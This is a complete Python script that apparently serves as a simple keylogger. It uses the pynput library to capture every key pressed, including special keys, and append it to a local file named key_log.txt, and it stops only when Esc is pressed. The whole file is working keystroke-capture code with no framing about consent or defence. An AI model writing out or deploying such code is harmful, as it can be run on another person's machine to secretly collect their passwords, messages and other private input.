from pynput import keyboard

# File to save the logs
LOG_FILE = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        # Log printable characters
        log_key = key.char
    except AttributeError:
        # Handle special keys like space, enter, etc.
        if key == keyboard.Key.space:
            log_key = ' '
        elif key == keyboard.Key.enter:
            log_key = '\n'
        else:
            log_key = f'[{key.name}]'

    # Write the logged key to the file
    with open(LOG_FILE, "a") as log:
        log.write(log_key)

# Function to handle key releases
def on_release(key):
    # Stop listener when Esc key is pressed
    if key == keyboard.Key.esc:
        return False

# Main function to set up the listener
def main():
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Entry point of the script
if __name__ == "__main__":
    main()
